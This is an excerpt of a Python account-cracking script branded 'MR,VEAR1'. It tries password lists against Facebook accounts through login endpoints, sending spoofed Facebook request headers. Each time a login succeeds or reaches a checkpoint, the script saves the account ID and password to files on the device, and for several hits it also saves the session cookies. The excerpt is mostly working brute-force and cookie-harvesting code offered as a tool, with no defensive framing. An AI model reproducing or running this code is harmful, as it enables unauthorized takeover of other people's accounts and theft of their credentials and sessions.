...
\033[1;96m ━━━━━━━━━━━━━━━━━━━\033[1;31mMR,VEAR1\33[38;5;196m━━━━━━━━━━━━━━━━━━━━
\x1b[1;36m{+} \x1b[1;91mTOOL CREATED BY   \x1b[1;97m:MR,VEAR1
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;36m [\033[1;32mMR,VEAR1\033[1;36m] \033[1;36m[\033[1;31m%s\033[1;36m] \033[1;36m[\033[1;32mOK\033[1;30m:-\033[1;32m%s\033[1;36m] \033[1;36m[\033[1;33m%s%%\033[1;36m]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
    ...
    'x-fb-request-id': 'AzCUf7bWJk7g0lcuEqz5I9O',
    'x-fb-trace-id': 'Czj4VvAteWe',
    'x-fb-rev': '1008105258',
    'x-fb-debug': 'CCZgeqTBmFtQSeqmeJ8zqJyDCrnCB/xOIl9RSlZyI+pSOdY+9T8sp3lEguHmy5bE74WU8gc4HxHXJQFj0dzA0A==',
    ...
    "user-agent": ua,
                        ...
                        if "c_user" in ASX:
                                print('\r\r\033[1;32m [MR,VEAR1-OK] %s | %s'%(ids,pas))
                                dc=dict(session.cookies)
                                coki=";".join([k+"="+v for k,v in dc.items()])
                                open('/sdcard/MR,VEAR1-COOKIE.txt','a').write(coki+'\n')
                                open('/sdcard/MR,VEAR1-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in ASX:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [MR,VEAR1-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MR,VEAR1-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        global ok,loop,lim
                        p=round(loop*100/lim,2)
                        sys.stdout.write('\r\r\033[1;37m [MR,VEAR1] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                             ...
                             'viewport-width': '980',}
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [MR,VEAR1-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MR,VEAR1-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
    ...
    'viewport-width': '980',
                                ...
                                if 'session_key' in q:
                                        ...
                                        if 'y' in pcp:
                                                ...
                                                open('/sdcard/MR,VEAR1CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
    ...
    'viewport-width': '980',
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [MR,VEAR1-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/MR,VEAR1-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/MR,VEAR1_OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [MR,VEAR1-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MR,VEAR1-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
